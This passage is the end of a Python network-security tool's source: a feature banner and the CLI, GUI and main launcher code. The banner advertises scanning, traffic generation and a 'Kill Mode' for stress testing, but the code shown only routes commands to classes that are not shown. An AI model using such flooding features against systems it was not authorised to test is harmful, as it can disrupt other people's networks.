║   Integrated Features: Port Scanning, Deep Analysis, Kill Mode, Location Lookup  ║
║                                                                                  ║
║   Features:                                                                      ║
║   • Real-time Network Monitoring      • Advanced Threat Detection                ║
║   • Port & Vulnerability Scanning     • Traffic Generation Tools                 ║
║   • Intrusion Detection System        • Comprehensive Reporting                  ║
║   • CLI & GUI Interfaces              • Telegram Integration                     ║
║   • Deep IP Analysis                  • Geographical Location Lookup             ║
║   • Kill Mode (Stress Testing)        • Database Logging & Analytics             ║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
"""
    print(banner)

def cli_mode():
    """Run in enhanced CLI mode"""
    db_manager = DatabaseManager()
    network_scanner = NetworkScanner(db_manager)
    network_monitor = NetworkMonitor(db_manager)
    telegram_manager = TelegramManager(db_manager)
    traffic_generator = NetworkTrafficGenerator(db_manager)
    
    terminal = TerminalEmulator(network_scanner, network_monitor, traffic_generator, telegram_manager)
    
    print_banner()
    print(f"\n{Colors.GREEN}🔧 Enhanced CLI Mode Activated{Colors.END}")
    print("Type 'help' for available commands")
    print("Type 'gui' to switch to GUI mode")
    print("Type 'exit' to quit\n")
    
    # Load command history
    try:
        if os.path.exists(HISTORY_FILE):
            with open(HISTORY_FILE, 'r') as f:
                for line in f:
                    readline.add_history(line.strip())
    except:
        pass
    
    while True:
        try:
            command = input(f"{Colors.GREEN}cyberdefense>{Colors.END} ").strip()
            if not command:
                continue
            
            # Save to history file
            try:
                with open(HISTORY_FILE, 'a') as f:
                    f.write(command + '\n')
            except:
                pass
            
            if command.lower() == 'exit':
                print(f"{Colors.YELLOW}👋 Exiting...{Colors.END}")
                network_monitor.stop_monitoring()
                traffic_generator.stop_traffic()
                break
            
            elif command.lower() == 'gui':
                print(f"{Colors.CYAN}🚀 Switching to GUI mode...{Colors.END}")
                return 'gui'
            
            elif command.lower() == 'menu':
                print_banner()
                print(f"\n{Colors.CYAN}Available modes:{Colors.END}")
                print("  1. CLI Mode (current)")
                print("  2. GUI Mode")
                print("  3. Exit")
                
                choice = input(f"\n{Colors.GREEN}Select mode (1-3):{Colors.END} ").strip()
                if choice == '2':
                    return 'gui'
                elif choice == '3':
                    print(f"{Colors.YELLOW}👋 Exiting...{Colors.END}")
                    network_monitor.stop_monitoring()
                    traffic_generator.stop_traffic()
                    break
            
            else:
                result = terminal.execute(command)
                if result == "EXIT":
                    print(f"{Colors.YELLOW}👋 Exiting...{Colors.END}")
                    network_monitor.stop_monitoring()
                    traffic_generator.stop_traffic()
                    break
                elif result:
                    print(result)
        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}👋 Exiting...{Colors.END}")
            network_monitor.stop_monitoring()
            traffic_generator.stop_traffic()
            break
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {e}{Colors.END}")

def gui_mode():
    """Run in GUI mode"""
    if not GUI_AVAILABLE:
        print(f"{Colors.RED}❌ GUI mode requires tkinter. Please install it or use CLI mode.{Colors.END}")
        print("On Ubuntu/Debian: sudo apt-get install python3-tk")
        print("On Fedora/RHEL: sudo dnf install python3-tkinter")
        print("On macOS: brew install python-tk")
        print("On Windows: Usually included with Python")
        return 'cli'
    
    # Initialize components
    db_manager = DatabaseManager()
    network_monitor = NetworkMonitor(db_manager)
    network_scanner = NetworkScanner(db_manager)
    telegram_manager = TelegramManager(db_manager)
    
    # Create main window
    root = tk.Tk()
    root.title(f"Accurate Cyber Defense v{VERSION} - Unified Security Platform")
    root.geometry("1200x800")
    
    try:
        app = CyberSecurityDashboard(root, db_manager, network_monitor, network_scanner, telegram_manager)
        
        # Handle window close
        def on_closing():
            network_monitor.stop_monitoring()
            root.quit()
            root.destroy()
        
        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.mainloop()
        
        return 'menu'
        
    except Exception as e:
        messagebox.showerror("Error", f"Failed to start GUI: {str(e)}")
        print(f"{Colors.RED}GUI Error: {e}{Colors.END}")
        return 'cli'

def main():
    """Main entry point"""
    print_banner()
    
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('cyber_security.log'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    # Check for command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == '--cli':
            mode = 'cli'
        elif sys.argv[1] == '--gui':
            mode = 'gui'
        else:
            print(f"Unknown argument: {sys.argv[1]}")
            print("Usage: python cyber_tool.py [--cli|--gui]")
            mode = 'menu'
    else:
        # Interactive mode selection
        print(f"\n{Colors.CYAN}Select mode:{Colors.END}")
        print("  1. CLI Mode (Command Line Interface)")
        print("  2. GUI Mode (Graphical User Interface)")
        print("  3. Exit")
        
        while True:
            choice = input(f"\n{Colors.GREEN}Select mode (1-3):{Colors.END} ").strip()
            if choice == '1':
                mode = 'cli'
                break
            elif choice == '2':
                mode = 'gui'
                break
            elif choice == '3':
                print(f"{Colors.YELLOW}👋 Thank you for using Accurate Cyber Defense!{Colors.END}")
                return
            else:
                print(f"{Colors.RED}Invalid choice. Please enter 1, 2, or 3.{Colors.END}")
    
    # Run selected mode
    while True:
        if mode == 'cli':
            mode = cli_mode()
        elif mode == 'gui':
            mode = gui_mode()
        elif mode == 'menu':
            print(f"\n{Colors.CYAN}Select mode:{Colors.END}")
            print("  1. CLI Mode (Command Line Interface)")
            print("  2. GUI Mode (Graphical User Interface)")
            print("  3. Exit")
            
            choice = input(f"\n{Colors.GREEN}Select mode (1-3):{Colors.END} ").strip()
            if choice == '1':
                mode = 'cli'
            elif choice == '2':
                mode = 'gui'
            elif choice == '3':
                print(f"{Colors.YELLOW}👋 Thank you for using Accurate Cyber Defense!{Colors.END}")
                break
            else:
                print(f"{Colors.RED}Invalid choice. Please enter 1, 2, or 3.{Colors.END}")
        else:
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}👋 Thank you for using Accurate Cyber Defense!{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}❌ Application error: {e}{Colors.END}")
        logging.exception("Application crash")